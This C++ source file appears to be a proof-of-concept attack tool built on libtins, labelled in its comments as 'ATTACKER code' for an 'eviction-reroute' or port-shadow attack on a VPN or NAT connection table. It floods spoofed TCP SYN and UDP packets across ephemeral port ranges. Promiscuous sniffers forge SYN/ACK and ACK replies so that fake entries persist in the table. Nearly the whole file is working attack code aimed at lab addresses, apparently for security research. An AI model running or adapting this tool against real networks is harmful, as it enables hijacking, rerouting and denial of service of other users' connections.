#include <tins/tins.h>
#include <cassert>
#include <iostream>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */

#include <string>
#include <unistd.h>
#include <thread>
#include <random>
#include <chrono>

using std::thread;
using std::cout;
using std::string;
using std::vector;
using namespace Tins;

string iface;
string attacker_priv_ip = "10.8.0.10";

#define PORT_RANGE_START 32768
#define PORT_RANGE_END  38000
// #define PORT_RANGE_END  61000
void tcp_attack_packets_fn() {

	/*Send a bunch of TCP SYN's from attacker*/

	PacketSender sender;
	NetworkInterface iface("enp0s8");

	IP pkt = IP("192.168.3.131", attacker_priv_ip) / TCP(PORT_RANGE_START, 80);
	IP& ip = pkt.rfind_pdu<IP>();
	TCP& tcp = pkt.rfind_pdu<TCP>();
	tcp.set_flag(TCP::SYN, 1);
	tcp.seq(1);
	tcp.ack_seq(0);

	while (true) {
		for (unsigned short dport = PORT_RANGE_START;
				dport < PORT_RANGE_END; dport++) {
			std::cout << "Sending: " << dport << std::endl;
			tcp.dport(dport);
			ip.ttl(2);
			sender.send(pkt, iface);
			usleep(1000);

		}	
		usleep(10000000);
	}
}

void tcp_fill_ephemeral_port_range() {
	/*Send a bunch of TCP SYN's from attacker*/

	string victim_ip = "192.168.3.13";
	string prefix = "192.168.3.";
	PacketSender sender;
	NetworkInterface iface("enp0s8"); // iface);
	IP pkt = IP(victim_ip, attacker_priv_ip) / TCP(PORT_RANGE_START, PORT_RANGE_START);
	IP& ip = pkt.rfind_pdu<IP>();
	TCP& tcp = pkt.rfind_pdu<TCP>();
	tcp.set_flag(TCP::ACK, 1);
	tcp.seq(12345);
	tcp.ack_seq(0);

	IP atk_pkt = IP("192.168.3.131", attacker_priv_ip) / TCP(PORT_RANGE_START, 80);
	IP& atk_ip = atk_pkt.rfind_pdu<IP>();
	TCP& atk_tcp = atk_pkt.rfind_pdu<TCP>();
	atk_tcp.set_flag(TCP::SYN, 1);
	atk_tcp.seq(12345);
	atk_tcp.ack_seq(0);


	while (true) {
		for (unsigned short sport = PORT_RANGE_START;
				sport < PORT_RANGE_END; sport++) {
			for (unsigned short dport = PORT_RANGE_START;
					dport < PORT_RANGE_END; dport++) {
				for (int octet = 13; octet < 25; octet++){
                                        string daddr = prefix + std::to_string(octet);
					// std::cout << "eviction-reroute: 1 function start_tcp_fill_ephemeral_port_range: " << sport << ", " << dport << ", octet: " << octet <<std::endl;
                                        ip.dst_addr(daddr);
					tcp.dport(dport);
					tcp.sport(sport);
					// std::cout << "eviction-reroute: 2 function start_tcp_fill_ephemeral_port_range: " << sport << ", " << dport << ", octet: " << octet << std::endl;
					ip.ttl(2);
					sender.send(pkt, iface);
					// std::cout << "eviction-reroute: 3 function start_tcp_fill_ephemeral_port_range: "<< sport << ", " << dport << ", octet: " << octet  << std::endl;
					usleep(1000);
					sender.send(atk_pkt, iface);
					usleep(1000);
					// std::cout << "eviction-reroute: 4 function start_tcp_fill_ephemeral_port_range: "<< sport << ", " << dport << ", octet"  << octet << std::endl;
				}
				// std::cout << "eviction-reroute: 5 function end innermost loop start_tcp_fill_ephemeral_port_range: " << sport << ", " << dport << ", octet: " << std::endl;
				usleep(10000);
			}
			// std::cout << "eviction-reroute: 6 function end middle loop start_tcp_fill_ephemeral_port_range"<< sport << ", " << "octet: " << std::endl;
			usleep(10000);
		}	
		// std::cout << "eviction-reroute: 7 function end outer loop start_tcp_fill_ephemeral_port_range" << std::endl;
		usleep(10000000);
	}
}


bool _sniff_tcp_response_target(PDU &some_pdu) {
	/* Respond to SYN's from attacker with SYN/ACKS*/
//define IPPROTO_UDP 17

	PacketSender sender;
	NetworkInterface iface("tun0");
	const IP &ip_resp = some_pdu.rfind_pdu<IP>();
	// std::cout<<"found packet with src IP: "<<ip.src_addr()<<"\n";
	// std::cout<<ip.src_addr()<<" -> "<<ip.dst_addr()<<"\n";
	if (ip_resp.src_addr() == "192.168.2.254"
		       	&& (ip_resp.dst_addr() == "192.168.3.13" 
				|| ip_resp.dst_addr() == "192.168.3.14"
				|| ip_resp.dst_addr() == "192.168.3.15"
				|| ip_resp.dst_addr() == "192.168.3.16"
				|| ip_resp.dst_addr() == "192.168.3.17"
				|| ip_resp.dst_addr() == "192.168.3.18"
				|| ip_resp.dst_addr() == "192.168.3.19"
				|| ip_resp.dst_addr() == "192.168.3.20"
				|| ip_resp.dst_addr() == "192.168.3.21"
				|| ip_resp.dst_addr() == "192.168.3.22"
				|| ip_resp.dst_addr() == "192.168.3.23"
				|| ip_resp.dst_addr() == "192.168.3.24")
		       	&& ip_resp.protocol() == IPPROTO_TCP) {

		TCP& tcp_resp = some_pdu.rfind_pdu<TCP>();
		unsigned short sport = tcp_resp.sport();
		unsigned short dport = tcp_resp.dport();
		IP pkt = IP(ip_resp.src_addr(), ip_resp.dst_addr()) / TCP(sport, dport)/RawPDU("0xdeadbeef");
		TCP& tcp = pkt.rfind_pdu<TCP>();
		IP& ip = pkt.rfind_pdu<IP>();
		tcp.seq(12345);
		tcp.set_flag(TCP::SYN, 1);
		tcp.set_flag(TCP::ACK, 1);
		tcp.ack_seq(tcp_resp.seq() + 1);
		ip.ttl(4);
		sender.send(pkt, iface);
	}
	return true;
}

void _sniff_tcp_response_target_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(_sniff_tcp_response_target);
}

bool _sniff_tcp_response_attacker(PDU &some_pdu) {
//define IPPROTO_UDP 17

	PacketSender sender;
	NetworkInterface iface(iface);
	const IP &ip_resp = some_pdu.rfind_pdu<IP>();
	// std::cout<<"found packet with src IP: "<<ip.src_addr()<<"\n";
	// std::cout<<ip.src_addr()<<" -> "<<ip.dst_addr()<<"\n";
	if ((ip_resp.src_addr() == "192.168.3.13" || ip_resp.src_addr() == "192.168.3.14"
				|| ip_resp.src_addr() == "192.168.3.15"
				|| ip_resp.src_addr() == "192.168.3.16"
				|| ip_resp.src_addr() == "192.168.3.17"
				|| ip_resp.src_addr() == "192.168.3.18"
				|| ip_resp.src_addr() == "192.168.3.19"
				|| ip_resp.src_addr() == "192.168.3.20"
				|| ip_resp.src_addr() == "192.168.3.21"
				|| ip_resp.src_addr() == "192.168.3.22"
				|| ip_resp.src_addr() == "192.168.3.23"
				|| ip_resp.src_addr() == "192.168.3.24")
		       	&& ip_resp.protocol() == IPPROTO_TCP) {


		const TCP& tcp_resp = some_pdu.rfind_pdu<TCP>();
		unsigned short sport = tcp_resp.sport();
		unsigned short dport = tcp_resp.dport();
		IP pkt = IP("192.168.2.254", ip_resp.dst_addr()) / TCP(sport, dport)/RawPDU("0xdeadbeef");
		TCP& tcp = pkt.rfind_pdu<TCP>();
		IP& ip = pkt.rfind_pdu<IP>();
		switch(tcp_resp.flags()) {
			case 5: // SYN/ACK
				tcp.seq(tcp_resp.ack_seq());
				tcp.set_flag(TCP::ACK, 1);
				tcp.ack_seq(tcp_resp.seq() + 1);
				ip.ttl(4);
				sender.send(pkt);
				break;
			default:
				break;
		}

	}
	return true;
}

void _sniff_tcp_response_attacker_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(_sniff_tcp_response_attacker);
}

void udp_attack_packets_fn() {

	/*Send a bunch of TCP SYN's from attacker*/

	PacketSender sender;
	NetworkInterface iface("enp0s8");

	IP pkt = IP("192.168.3.131", attacker_priv_ip) / UDP(PORT_RANGE_START, 53);
	IP& ip = pkt.rfind_pdu<IP>();
	UDP& udp = pkt.rfind_pdu<UDP>();
	while (true) {
		for (unsigned short dport = PORT_RANGE_START;
				dport < PORT_RANGE_END; dport++) {
			std::cout << "Sending: " << dport << std::endl;
			udp.dport(dport);
			ip.ttl(2);
			sender.send(pkt, iface);
			usleep(1000);

		}	
		usleep(10000000);
	}
}


void udp_fill_ephemeral_port_range() {

	PacketSender sender;
	NetworkInterface iface("enp0s8");

	IP pkt = IP("192.168.3.13", attacker_priv_ip) / UDP(PORT_RANGE_START, PORT_RANGE_START);
	IP& ip = pkt.rfind_pdu<IP>();
	ip.ttl(2);
	UDP& udp = pkt.rfind_pdu<UDP>();
	IP atk_pkt = IP("192.168.3.13", attacker_priv_ip) / UDP(PORT_RANGE_START, 53);
	IP& atk_ip = atk_pkt.rfind_pdu<IP>();
	atk_ip.ttl(2);
	UDP& atk_udp = atk_pkt.rfind_pdu<UDP>();

	while (true) {
		for (unsigned short sport = PORT_RANGE_START;
				sport < PORT_RANGE_END; sport++) {
			for (unsigned short dport = PORT_RANGE_START;
					dport < PORT_RANGE_END; dport++) {
				udp.dport(dport);
				atk_udp.dport(dport);
				udp.sport(sport);
				sender.send(pkt, iface);
				usleep(100);
				sender.send(atk_pkt, iface);
			}
		}	
		usleep(10000000);
	}

}




bool _sniff_udp_response_target_handler(PDU &some_pdu) {
//define IPPROTO_UDP 17

	PacketSender sender;
	NetworkInterface iface(iface);
	const IP &ip_resp = some_pdu.rfind_pdu<IP>();
	// std::cout<<"found packet with src IP: "<<ip.src_addr()<<"\n";
	// std::cout<<ip.src_addr()<<" -> "<<ip.dst_addr()<<"\n";
	if (ip_resp.src_addr() == "192.168.2.254"
		       	&& (ip_resp.dst_addr() == "192.168.3.13" 
				|| ip_resp.dst_addr() == "192.168.3.14"
				|| ip_resp.dst_addr() == "192.168.3.15"
				|| ip_resp.dst_addr() == "192.168.3.16"
				|| ip_resp.dst_addr() == "192.168.3.17"
				|| ip_resp.dst_addr() == "192.168.3.18"
				|| ip_resp.dst_addr() == "192.168.3.19"
				|| ip_resp.dst_addr() == "192.168.3.20"
				|| ip_resp.dst_addr() == "192.168.3.21"
				|| ip_resp.dst_addr() == "192.168.3.22"
				|| ip_resp.dst_addr() == "192.168.3.23"
				|| ip_resp.dst_addr() == "192.168.3.24")
		       	&& ip_resp.protocol() == IPPROTO_UDP) {
		// const RawPDU &pl_resp = some_pdu.rfind_pdu<RawPDU>();

		/*
		if (pl_resp.payload_size() == sizeof("0xdeadbeef")) {
			std::cout << "FOOO BAR!!!!" << std::endl;
		}
		*
		*/
	        if (ip_resp.tot_len() == 39) {	

			UDP& udp_resp = some_pdu.rfind_pdu<UDP>();
			unsigned short sport = udp_resp.sport();
			unsigned short dport = udp_resp.dport();
			IP pkt = IP("192.168.2.254", ip_resp.dst_addr()) / UDP(sport, dport)/RawPDU("0xdeadbeef");
			IP& ip = pkt.rfind_pdu<IP>();
			ip.ttl(4);
			sender.send(pkt);
		} else {
			std::cout << "payload_size = " << ip_resp.tot_len() << std::endl;
		}
	}
	return true;
}

void sniff_udp_response_target_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(_sniff_udp_response_target_handler);
}

int main(int argc, char** argv) {
	if (argc != 2) {
		cout << "sike wrong number of args ---> (iface)\n";
		return 0;
	}

	iface = argv[1];
	std::cout << "eviction-reroute: iface=" << iface << std::endl;
	bool do_tcp = false;
	bool do_attacker = false;
	if (do_tcp) {
		std::cout << "eviction-reroute: if do_tcp" << std::endl;
		if (do_attacker) {// ATTACKER code
			std::cout << "eviction-reroute: if do attacker" << std::endl;
			//1. Start the thread to fill the table by sending SYNs
			thread tcp_fill_ephemeral_port_range_thread(tcp_fill_ephemeral_port_range);
			std::cout << "eviction-reroute: start_tcp_fill_ephemeral_port_range" << std::endl;
			tcp_fill_ephemeral_port_range_thread.detach();

			// 2. Start the thread to create the port shadow 
			thread tcp_attack_packets_thread(tcp_attack_packets_fn);
			tcp_attack_packets_thread.detach();

			// 3. Start the thread to fill the table by sending ACKs to SYN/ACKS 
			thread sniff_tcp_response_target_handler_thread(_sniff_tcp_response_target_handler);
			sniff_tcp_response_target_handler_thread.join();

		} else {
			// 1. Start the thread to send SYN/ACKS from a separate attacher machine to fill the table
			// with persistent entries.
			thread sniff_tcp_response_target_handler_thread(_sniff_tcp_response_target_handler);
			sniff_tcp_response_target_handler_thread.join();
		}
	} else {
		// XXX: Fill in the udp related code for this.
		if (do_attacker) {// ATTACKER code
			std::cout << "eviction-reroute: if do attacker" << std::endl;
			//1. Start the thread to fill the table by sending SYNs
			thread udp_fill_ephemeral_port_range_thread(udp_fill_ephemeral_port_range);
			std::cout << "eviction-reroute: start_udp_fill_ephemeral_port_range" << std::endl;
			udp_fill_ephemeral_port_range_thread.detach();

			// 2. Start the thread to create the port shadow 
			thread udp_attack_packets_thread(udp_attack_packets_fn);
			udp_attack_packets_thread.join();

			// 3. Start the thread to fill the table by sending ACKs to SYN/ACKS 
			// thread sniff_udp_response_target_handler_thread(sniff_udp_response_target_handler);
			// sniff_udp_response_target_handler_thread.join();
		} else {
			// 1. Start the thread to send SYN/ACKS from a separate attacher machine to fill the table
			// with persistent entries.
			thread sniff_udp_response_target_handler_thread(sniff_udp_response_target_handler);
			sniff_udp_response_target_handler_thread.join();
		}
	
	}
	return 0;
}

